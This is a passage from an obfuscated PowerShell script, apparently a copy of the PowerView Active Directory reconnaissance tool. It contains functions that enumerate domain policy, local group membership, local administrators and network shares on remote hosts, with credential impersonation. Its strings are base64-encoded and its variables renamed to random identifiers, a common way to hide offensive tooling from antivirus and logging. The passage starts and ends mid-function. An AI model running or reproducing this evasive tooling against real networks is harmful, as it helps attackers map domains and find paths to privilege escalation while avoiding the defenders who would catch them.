('SQBzAEcAcgBvAHUAcAA='))) ${0c2afad63ade46fd8530706fe09c250b}
       
                 ${90d2ec3ce39f46d7a448d654e26a3acb} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) 
${99e435de2e8c4448bb98cb268b197bc1}.GPODisplayName
                   
     ${90d2ec3ce39f46d7a448d654e26a3acb} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8ARwB1AGkAZAA='))) 
${99e435de2e8c4448bb98cb268b197bc1}.GPOName
                        
${90d2ec3ce39f46d7a448d654e26a3acb} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8AUABhAHQAaAA='))) 
${99e435de2e8c4448bb98cb268b197bc1}.GPOPath
                        
${90d2ec3ce39f46d7a448d654e26a3acb} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8AVAB5AHAAZQA='))) 
${99e435de2e8c4448bb98cb268b197bc1}.GPOType
                        
${90d2ec3ce39f46d7a448d654e26a3acb}.PSObject.TypeNames.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBDAG8AbQBwAHUAdABlAHIATABvAGMAYQ
BsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                        
${90d2ec3ce39f46d7a448d654e26a3acb}
                    }
             
   }
            }
        }
    }
}
function Get-DomainPolicyData {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('Source', 'Name')]
        [String]
        
$Policy = 'Domain',
        [ValidateNotNullOrEmpty()]
        
[String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        
[Alias('DomainController')]
        [String]
        $Server,
        
[ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
      
  [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${ea43c787582f45539b7f519da4680c7a} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${862f5010d4134855b91a80cc000960e1} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${862f5010d4134855b91a80cc000960e1}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${862f5010d4134855b91a80cc000960e1}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) {
            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain
            
${862f5010d4134855b91a80cc000960e1}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain
        }
        if ($Policy -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBsAGwA')))) {
            ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = '*'
        }
        elseif 
($Policy -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) {
            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ewAzADEAQgAyAEYAMwA0ADAALQAwADEANgBEAC0AMQAxAEQAMgAtADkANAA1AEYALQ
AwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        elseif 
(($Policy -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgA=')))) -or ($Policy -eq 
'DC')) {
            ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ewA2AEEAQwAxADcAOAA2AEMALQAwADEANgBGAC0AMQAxAEQAMgAtADkANAA1AEYALQ
AwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        else {
    
        ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Policy
        }
        
${a8d265eb5a8f425f9189d0c15c10c5f0} = Get-DomainGPO 
@ea43c787582f45539b7f519da4680c7a
        ForEach 
(${4c31ae76c0f64fb698a3074ad3ea5e60} in 
${a8d265eb5a8f425f9189d0c15c10c5f0}) {
            $GptTmplPath = 
${4c31ae76c0f64fb698a3074ad3ea5e60}.gpcfilesyspath + 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8Adw
BzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')
))
            ${96fd7dc3c11c4955a085d10a19676226} =  @{
              
  'GptTmplPath' = $GptTmplPath
                'OutputObject' = 
$True
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${96fd7dc3c11c4955a085d10a19676226}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            Get-
GptTmpl @96fd7dc3c11c4955a085d10a19676226 | ForEach-Object {
         
       $_ | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8ATgBhAG0AZQA='))) ${4c31ae76c0f64fb698a3074ad3ea5e60}.name
  
              $_ | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) 
${4c31ae76c0f64fb698a3074ad3ea5e60}.displayname
                $_
    
        }
        }
    }
}
function Get-NetLocalGroup {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.LocalGroup.API')]
    [OutputType
('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
       
 [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = $Env:COMPUTERNAME,
        
[ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
     
   [String]
        $Method = 'API',
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            if ($Method -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBQAEkA')))) {
                ${7167c5f4208044fbbda5f32ba6f54f80} 
= 1
                ${3cb25c0653624048a18c1e94cd5422f2} = 
[IntPtr]::Zero
                ${347b3a3d0e1944f09811a46922972f16} = 
0
                ${d8e3734f3f9b4abb931db148d62e534a} = 0
             
   ${a73887482c7b4d84a0ec3abf865c8e35} = 0
                
${cb7c2f5226ed472aad598a82813f1629} = 
${b65b271ff93e4a76a0ec16347a31f911}::NetLocalGroupEnum
(${9c0baec859734fc983ee3c04b4cde8a7}, 
${7167c5f4208044fbbda5f32ba6f54f80}, 
[ref]${3cb25c0653624048a18c1e94cd5422f2}, -1, 
[ref]${347b3a3d0e1944f09811a46922972f16}, 
[ref]${d8e3734f3f9b4abb931db148d62e534a}, 
[ref]${a73887482c7b4d84a0ec3abf865c8e35})
                $Offset = 
${3cb25c0653624048a18c1e94cd5422f2}.ToInt64()
                if 
((${cb7c2f5226ed472aad598a82813f1629} -eq 0) -and ($Offset -gt 0)) 
{
                    ${212b5abc53674a08833ac540af56a71e} = 
${ea327b0784a642188789c5e39aed4e7d}::GetSize()
                    
for (${9e5bb180fda8451b8ec7f5d4ed0667a4} = 0; 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} -lt 
${347b3a3d0e1944f09811a46922972f16}); 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++) {
                        
${dffff067b0bb45ce8471f1eab3733053} = New-Object System.Intptr -
ArgumentList $Offset
                        
${3893d1cccfdb4991a1cf64ee551c52b6} = 
${dffff067b0bb45ce8471f1eab3733053} -as 
${ea327b0784a642188789c5e39aed4e7d}
                        $Offset = 
${dffff067b0bb45ce8471f1eab3733053}.ToInt64()
                        
$Offset += ${212b5abc53674a08833ac540af56a71e}
                       
 $LocalGroup = New-Object PSObject
                        
$LocalGroup | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                        
$LocalGroup | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE4AYQBtAGUA'))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.lgrpi1_name
                      
  $LocalGroup | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AbQBlAG4AdAA='))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.lgrpi1_comment
                   
     $LocalGroup.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AQQBQAEkA')
)))
                        $LocalGroup
                    }
          
          $Null = 
${b65b271ff93e4a76a0ec16347a31f911}::NetApiBufferFree
(${3cb25c0653624048a18c1e94cd5422f2})
                }
               
 else {
                    Write-Verbose "[Get-NetLocalGroup] Error: 
$(([ComponentModel.Win32Exception] 
${cb7c2f5226ed472aad598a82813f1629}).Message)"
                }
      
      }
            else {
                
${2f396599656b4cdbb74209d3020ae671} = 
[ADSI]$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBpAG4ATgBUADoALwAvACQAewA5AGMAMABiAGEAZQBjADgANQA5ADcAMwA0AGYAYw
A5ADgAMwBlAGUAMwBjADAANABiADQAYwBkAGUAOABhADcAfQAsAGMAbwBtAHAAdQB0AG
UAcgA=')))
                
${2f396599656b4cdbb74209d3020ae671}.psbase.children | Where-Object { 
$_.psbase.schemaClassName -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))) } | ForEach-
Object {
                    $LocalGroup = ([ADSI]$_)
                 
   ${b5a50316dca4465cad6cfeb0e116447c} = New-Object PSObject
         
           ${b5a50316dca4465cad6cfeb0e116447c} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                    
${b5a50316dca4465cad6cfeb0e116447c} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE4AYQBtAGUA'))) ($LocalGroup.InvokeGet
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBhAG0AZQA=')))))
                    
${b5a50316dca4465cad6cfeb0e116447c} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBJAEQA'))) ((New-Object 
System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAcwBpAGQA')))),0)).Value)
                    
${b5a50316dca4465cad6cfeb0e116447c} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AbQBlAG4AdAA='))) ($LocalGroup.InvokeGet
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))))
                    
${b5a50316dca4465cad6cfeb0e116447c}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AVwBpAG4ATg
BUAA=='))))
                    ${b5a50316dca4465cad6cfeb0e116447c}
   
             }
            }
        }
    }
    END {
        if 
(${bfcebd26467f492297f5dcbf75cad4ab}) {
            Invoke-
RevertToSelf -TokenHandle ${bfcebd26467f492297f5dcbf75cad4ab}
        
}
    }
}
function Get-NetLocalGroupMember {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.LocalGroupMember.API')]
    [OutputType
('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter
(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = $Env:COMPUTERNAME,
        
[Parameter(ValueFromPipelineByPropertyName = $True)]
        
[ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 
'Administrators',
        [ValidateSet('API', 'WinNT')]
        
[Alias('CollectionMethod')]
        [String]
        $Method = 'API',
  
      [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            if ($Method -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBQAEkA')))) {
                ${7167c5f4208044fbbda5f32ba6f54f80} 
= 2
                ${3cb25c0653624048a18c1e94cd5422f2} = 
[IntPtr]::Zero
                ${347b3a3d0e1944f09811a46922972f16} = 
0
                ${d8e3734f3f9b4abb931db148d62e534a} = 0
             
   ${a73887482c7b4d84a0ec3abf865c8e35} = 0
                
${cb7c2f5226ed472aad598a82813f1629} = 
${b65b271ff93e4a76a0ec16347a31f911}::NetLocalGroupGetMembers
(${9c0baec859734fc983ee3c04b4cde8a7}, $GroupName, 
${7167c5f4208044fbbda5f32ba6f54f80}, 
[ref]${3cb25c0653624048a18c1e94cd5422f2}, -1, 
[ref]${347b3a3d0e1944f09811a46922972f16}, 
[ref]${d8e3734f3f9b4abb931db148d62e534a}, 
[ref]${a73887482c7b4d84a0ec3abf865c8e35})
                $Offset = 
${3cb25c0653624048a18c1e94cd5422f2}.ToInt64()
                
$Members = @()
                if 
((${cb7c2f5226ed472aad598a82813f1629} -eq 0) -and ($Offset -gt 0)) 
{
                    ${212b5abc53674a08833ac540af56a71e} = 
${c3e5754901224ca98efa148d6a7452bc}::GetSize()
                    
for (${9e5bb180fda8451b8ec7f5d4ed0667a4} = 0; 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} -lt 
${347b3a3d0e1944f09811a46922972f16}); 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++) {
                        
${dffff067b0bb45ce8471f1eab3733053} = New-Object System.Intptr -
ArgumentList $Offset
                        
${3893d1cccfdb4991a1cf64ee551c52b6} = 
${dffff067b0bb45ce8471f1eab3733053} -as 
${c3e5754901224ca98efa148d6a7452bc}
                        $Offset = 
${dffff067b0bb45ce8471f1eab3733053}.ToInt64()
                        
$Offset += ${212b5abc53674a08833ac540af56a71e}
                       
 ${6d87af06ff884460a7b63ff381812d79} = ''
                        
${97076fcc9e8845048d20af95e4436690} = 
${d8402eaefa6844d19815430c6481b92a}::ConvertSidToStringSid
(${3893d1cccfdb4991a1cf64ee551c52b6}.lgrmi2_sid, 
[ref]${6d87af06ff884460a7b63ff381812d79});
${540d2c2f94624a079816177d2dca65b6} = 
[Runtime.InteropServices.Marshal]::GetLastWin32Error()
               
         if (${97076fcc9e8845048d20af95e4436690} -eq 0) {
            
                Write-Verbose "[Get-NetLocalGroupMember] Error: 
$(([ComponentModel.Win32Exception] 
${540d2c2f94624a079816177d2dca65b6}).Message)"
                       
 }
                        else {
                            
${1b7dd34bbb37407f828b2f620f59a5e8} = New-Object PSObject
            
                ${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                            
${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                            
${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.lgrmi2_domainandname
             
               ${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBJAEQA'))) 
${6d87af06ff884460a7b63ff381812d79}
                            
${0c2afad63ade46fd8530706fe09c250b} = 
$(${3893d1cccfdb4991a1cf64ee551c52b6}.lgrmi2_sidusage -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAGQAVAB5AHAAZQBHAHIAbwB1AHAA'))))
                            
${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBzAEcAcgBvAHUAcAA='))) ${0c2afad63ade46fd8530706fe09c250b}
       
                     
${1b7dd34bbb37407f828b2f620f59a5e8}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQ
ByAC4AQQBQAEkA'))))
                            $Members += 
${1b7dd34bbb37407f828b2f620f59a5e8}
                        }
         
           }
                    $Null = 
${b65b271ff93e4a76a0ec16347a31f911}::NetApiBufferFree
(${3cb25c0653624048a18c1e94cd5422f2})
                    
${a6aa11e6d34f4175adcab8a6a75fe45c} = $Members | Where-Object 
{$_.SID -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('LgAqAC0ANQAwADAA'))) -or ($_.SID -
match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('LgAqAC0ANQAwADEA'))))} | Select-Object 
-Expand SID
                    if 
(${a6aa11e6d34f4175adcab8a6a75fe45c}) {
                        
${a6aa11e6d34f4175adcab8a6a75fe45c} = 
${a6aa11e6d34f4175adcab8a6a75fe45c}.Substring(0, 
${a6aa11e6d34f4175adcab8a6a75fe45c}.LastIndexOf('-'))
                
        $Members | ForEach-Object {
                            if 
($_.SID -match ${a6aa11e6d34f4175adcab8a6a75fe45c}) {
                
                $_ | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
   
                         else {
                                $_ | 
Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $True
     
                       }
                        }
                    
}
                    else {
                        $Members | 
ForEach-Object {
                            if ($_.SID -notmatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMgAxAA==')))) {
                                $_ 
| Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
    
                        }
                            else {
          
                      $_ | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBzAEQAbwBtAGEAaQBuAA=='))) $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
               
             }
                        }
                    }
         
           $Members
                }
                else {
           
         Write-Verbose "[Get-NetLocalGroupMember] Error: 
$(([ComponentModel.Win32Exception] 
${cb7c2f5226ed472aad598a82813f1629}).Message)"
                }
      
      }
            else {
                try {
                    
${dbccd3678ccf4cfa9f7ac8528946ba7b} = 
[ADSI]$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBpAG4ATgBUADoALwAvACQAewA5AGMAMABiAGEAZQBjADgANQA5ADcAMwA0AGYAYw
A5ADgAMwBlAGUAMwBjADAANABiADQAYwBkAGUAOABhADcAfQAvACQARwByAG8AdQBwAE
4AYQBtAGUALABnAHIAbwB1AHAA')))
                    
${dbccd3678ccf4cfa9f7ac8528946ba7b}.psbase.Invoke
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIAcwA=')))) | ForEach-Object {
                       
 ${1b7dd34bbb37407f828b2f620f59a5e8} = New-Object PSObject
           
             ${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                        
${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                        
${5e68421be243447a958ea8fb6b21a2b6} = ([ADSI]$_)
                     
   ${9d87d894c72d4a02a141a5134c47f277} = 
${5e68421be243447a958ea8fb6b21a2b6}.InvokeGet
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBkAHMAUABhAHQAaAA=')))).Replace
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBpAG4ATgBUADoALwAvAA=='))), '')
                        
${0c2afad63ade46fd8530706fe09c250b} = 
(${5e68421be243447a958ea8fb6b21a2b6}.SchemaClassName -like 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZwByAG8AdQBwAA=='))))
                        if(([regex]::Matches
(${9d87d894c72d4a02a141a5134c47f277}, '/')).count -eq 1) {
           
                 ${17e6636ce8434e4482f4fce83538ea25} = $True
         
                   $Name = 
${9d87d894c72d4a02a141a5134c47f277}.Replace('/', '\')
                
        }
                        else {
                            
${17e6636ce8434e4482f4fce83538ea25} = $False
                         
   $Name = ${9d87d894c72d4a02a141a5134c47f277}.Substring
(${9d87d894c72d4a02a141a5134c47f277}.IndexOf('/')+1).Replace('/', 
'\')
                        }
                        
${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Name
                        
${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBJAEQA'))) ((New-Object 
System.Security.Principal.SecurityIdentifier
(${5e68421be243447a958ea8fb6b21a2b6}.InvokeGet
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQAUwBJAEQA')))),0)).Value)
                        
${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBzAEcAcgBvAHUAcAA='))) ${0c2afad63ade46fd8530706fe09c250b}
       
                 ${1b7dd34bbb37407f828b2f620f59a5e8} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) 
${17e6636ce8434e4482f4fce83538ea25}
                        
${1b7dd34bbb37407f828b2f620f59a5e8}
                    }
             
   }
                catch {
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAE4AZQB0AEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAXQ
AgAEUAcgByAG8AcgAgAGYAbwByACAAJAB7ADkAYwAwAGIAYQBlAGMAOAA1ADkANwAzAD
QAZgBjADkAOAAzAGUAZQAzAGMAMAA0AGIANABjAGQAZQA4AGEANwB9ACAAOgAgACQAXw
A=')))
                }
            }
        }
    }
    END {
        
if (${bfcebd26467f492297f5dcbf75cad4ab}) {
            Invoke-
RevertToSelf -TokenHandle ${bfcebd26467f492297f5dcbf75cad4ab}
        
}
    }
}
function Get-NetShare {
    [OutputType
('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = 'localhost',
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            ${7167c5f4208044fbbda5f32ba6f54f80} = 1
  
          ${3cb25c0653624048a18c1e94cd5422f2} = [IntPtr]::Zero
       
     ${347b3a3d0e1944f09811a46922972f16} = 0
            
${d8e3734f3f9b4abb931db148d62e534a} = 0
            
${a73887482c7b4d84a0ec3abf865c8e35} = 0
            
${cb7c2f5226ed472aad598a82813f1629} = 
${b65b271ff93e4a76a0ec16347a31f911}::NetShareEnum
(${9c0baec859734fc983ee3c04b4cde8a7}, 
${7167c5f4208044fbbda5f32ba6f54f80}, 
[ref]${3cb25c0653624048a18c1e94cd5422f2}, -1, 
[ref]${347b3a3d0e1944f09811a46922972f16}, 
[ref]${d8e3734f3f9b4abb931db148d62e534a}, 
[ref]${a73887482c7b4d84a0ec3abf865c8e35})
            $Offset = 
${3cb25c0653624048a18c1e94cd5422f2}.ToInt64()
            if 
((${cb7c2f5226ed472aad598a82813f1629} -eq 0) -and ($Offset -gt 0)) 
{
                ${212b5abc53674a08833ac540af56a71e} = 
${505cfd894b7744429f33666610c70105}::GetSize()
                for 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} = 0; 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} -lt 
${347b3a3d0e1944f09811a46922972f16}); 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++) {
                    
${dffff067b0bb45ce8471f1eab3733053} = New-Object System.Intptr -
ArgumentList $Offset
                    
${3893d1cccfdb4991a1cf64ee551c52b6} = 
${dffff067b0bb45ce8471f1eab3733053} -as 
${505cfd894b7744429f33666610c70105}
                    
